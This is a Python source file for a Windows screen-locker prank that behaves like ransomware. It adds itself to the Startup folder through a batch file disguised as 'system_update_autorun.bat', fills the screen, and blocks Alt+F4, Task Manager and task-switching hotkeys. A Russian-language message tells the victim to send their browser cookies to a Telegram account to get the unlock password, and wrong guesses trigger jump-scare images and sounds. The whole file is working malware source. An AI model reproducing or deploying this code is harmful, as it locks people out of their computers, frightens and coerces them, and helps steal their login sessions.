from tkinter import *
from tkinter import ttk
import random
import keyboard
import threading
import pygame
import sys
import os
from PIL import ImageTk, Image

CORRECT_PASSWORD = "3421"
pygame.mixer.init()

def resource_path(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

def add_to_startup():
    startup_dir = os.path.join(
        os.getenv("APPDATA"),
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )
    script_path = os.path.abspath(sys.argv[0])
    bat_path = os.path.join(startup_dir, "system_update_autorun.bat")
    
    if not os.path.exists(bat_path):
        with open(bat_path, "w") as bat:
            bat.write(f'start "" "{script_path}"')

add_to_startup()

class ScaryApp:
    def __init__(self):
        self.hotkeys_enabled = False
        self.screamer_open = False
        self.fail_count = 0

        self.enable_hotkeys()

        self.root = Tk()
        self.root.title("Ольга 400 метров от вас")
        self.root.attributes("-fullscreen", True)

        self.bg = ImageTk.PhotoImage(Image.open(resource_path("mainbg.jpg")))
        Label(self.root, image=self.bg).pack(fill="both", expand=True)

        self.label = Label(
            self.root,
            text="ТВОЯ ВИНДА ЗАБЛОКАНА СКИДЫВАЙ ПЕЧЕНЬКИ НА ЭТОТ ТГ @SYBAU228 ЧТО БЫ ПОЛУЧИТЬ ПАРОЛЬ",
            font=("Arial", 28, "bold"),
            fg="red",
            bg="black"
        )
        self.label.place(relx=0.5, rely=0.3, anchor=CENTER)

        self.entry = Entry(self.root, font=("Arial", 22), show="*")
        self.entry.place(relx=0.5, rely=0.45, anchor=CENTER)

        self.ok_btn = ttk.Button(self.root, text="OK", command=self.check_password)
        self.ok_btn.place(relx=0.5, rely=0.55, anchor=CENTER)

        self.root.protocol("WM_DELETE_WINDOW", self.safe_exit)
        self.root.mainloop()

    def special_screamer(self):
        if self.screamer_open:
            return

        self.screamer_open = True

        scr = Toplevel()
        scr.attributes("-fullscreen", True)
        scr.config(bg="black")

        img = ImageTk.PhotoImage(Image.open(resource_path("special.jpg")))
        lbl = Label(scr, image=img, bg="black")
        lbl.image = img
        lbl.pack(expand=True)

        pygame.mixer.music.load(resource_path("special_sound.mp3"))
        pygame.mixer.music.play()

        def close_special():
            self.screamer_open = False
            scr.destroy()

        scr.after(13000, close_special)

    def enable_hotkeys(self):
        if not self.hotkeys_enabled:
            keyboard.add_hotkey("alt+f4", lambda: None, suppress=True)
            keyboard.add_hotkey("ctrl+shift+esc", lambda: None, suppress=True)
            keyboard.add_hotkey("alt+tab", lambda: None, suppress=True)
            keyboard.add_hotkey("win+tab", lambda: None, suppress=True)
            self.hotkeys_enabled = True

    def disable_hotkeys(self):
        if self.hotkeys_enabled:
            keyboard.unhook_all_hotkeys()
            self.hotkeys_enabled = False

    def safe_exit(self):
        self.disable_hotkeys()
        pygame.mixer.quit()
        self.root.destroy()

    def check_password(self):
        pwd = self.entry.get()

        if pwd == CORRECT_PASSWORD:
            self.safe_exit()
            return

        self.fail_count += 1

        if self.fail_count == 6:
            pygame.mixer.music.stop()
            self.screamer_open = False
            self.special_screamer()
            return

        self.show_screamer()

    def play_sound(self):
        pygame.mixer.music.load(resource_path("screamer.mp3"))
        pygame.mixer.music.play()

    def show_screamer(self):
        if self.screamer_open:
            return

        self.screamer_open = True

        scr = Toplevel()
        scr.attributes("-fullscreen", True)
        scr.config(bg="black")

        img_file = random.choice(
            ["screamer1.jpg", "screamer3.jpg", "screamer4.jpg"]
        )
        img = ImageTk.PhotoImage(Image.open(resource_path(img_file)))

        lbl = Label(scr, image=img, bg="black")
        lbl.image = img
        lbl.pack(expand=True)

        threading.Thread(target=self.play_sound, daemon=True).start()

        def close_screamer():
            self.screamer_open = False
            scr.destroy()

        scr.after(1500, close_screamer)

ScaryApp()
